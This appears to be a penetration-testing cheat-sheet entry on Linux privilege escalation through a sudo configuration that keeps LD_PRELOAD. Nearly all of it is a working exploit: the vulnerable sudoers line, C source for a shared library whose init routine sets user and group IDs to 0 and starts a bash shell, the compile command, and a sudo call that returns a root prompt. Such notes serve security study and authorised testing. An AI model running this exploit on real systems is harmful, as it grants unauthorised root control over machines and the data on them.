# Ld_preload

## Vuln

If you see LD_PRELOAD

```
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
env_keep+=LD_PRELOAD
```

Try 

## Exploit

```sh
nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```

```
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
$ sudo LD_PRELOAD=/tmp/shell.so sky_backup_utility
root$
```
